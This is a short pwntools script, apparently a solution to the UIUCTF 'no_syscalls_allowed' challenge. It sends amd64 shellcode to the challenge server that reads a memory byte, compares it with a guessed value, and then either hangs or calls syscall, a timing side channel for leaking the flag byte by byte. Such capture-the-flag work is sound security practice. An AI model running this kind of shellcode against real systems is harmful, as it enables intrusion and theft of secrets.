from pwn import *
elf = ELF("no_syscalls_allowed")
#p = elf.process()
p = remote("no-syscalls-allowed.chal.uiuc.tf", 1337)
context.arch = "amd64"
i = 0
payload = asm(f"""
	mov r14,[rsp]
	and r14, 0xfffffffffffff000
	add r14, 0x3080
	mov r15b, BYTE PTR [r14]
	xor r15b, {i}
	cmp r15b, 0
	jne loop
	syscall
			
	loop:
	jmp loop
""")

p.sendline(payload)
p.recvline(timeout = 20)

